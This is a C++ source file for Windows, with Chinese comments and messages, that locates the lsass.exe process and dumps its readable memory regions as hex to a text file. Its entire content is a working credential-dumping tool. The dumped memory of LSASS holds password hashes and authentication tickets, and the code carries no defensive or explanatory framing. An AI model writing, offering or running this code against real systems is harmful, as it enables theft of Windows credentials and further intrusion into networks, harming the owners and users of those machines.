#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <regex>
#include <fstream>

DWORD GetLsassProcessId() {
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                    lsassPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return lsassPid;
}

std::string BytesToHexString(const std::vector<BYTE>& buffer, SIZE_T bytesRead) {
    std::ostringstream oss;
    for (SIZE_T i = 0; i < bytesRead; ++i) {
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(buffer[i]);
    }
    return oss.str();
}

void DumpLsassMemory(DWORD pid, const std::string& filename) {
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess) {
        std::ofstream outFile(filename);
        if (!outFile) {
            std::cerr << "无法打开文件进行写入。" << std::endl;
            CloseHandle(hProcess);
            return;
        }

        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T address = 0;
        while (VirtualQueryEx(hProcess, (LPCVOID)address, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE || mbi.Protect & PAGE_READONLY)) {
                std::vector<BYTE> buffer(mbi.RegionSize);
                SIZE_T bytesRead;
                if (ReadProcessMemory(hProcess, (LPCVOID)address, buffer.data(), mbi.RegionSize, &bytesRead)) {
                    // 将读取的字节转换为16进制字符串
                    std::string hexData = BytesToHexString(buffer, bytesRead);
                    // 将16进制字符串写入文件
                    outFile << "Address: " << std::hex << address << ", Data: " << hexData << std::endl;
                }
            }
            address += mbi.RegionSize;
        }
        outFile.close();
        CloseHandle(hProcess);
    }
    else {
        std::cerr << "无法打开 LSASS 进程。" << std::endl;
    }
}

int main() {
    DWORD lsassPid = GetLsassProcessId();
    if (lsassPid) {
        std::cout << "LSASS 进程 ID: " << lsassPid << std::endl;
        DumpLsassMemory(lsassPid, "memory_dump.txt");
    }
    else {
        std::cerr << "未找到 LSASS 进程。" << std::endl;
    }
    return 0;
}
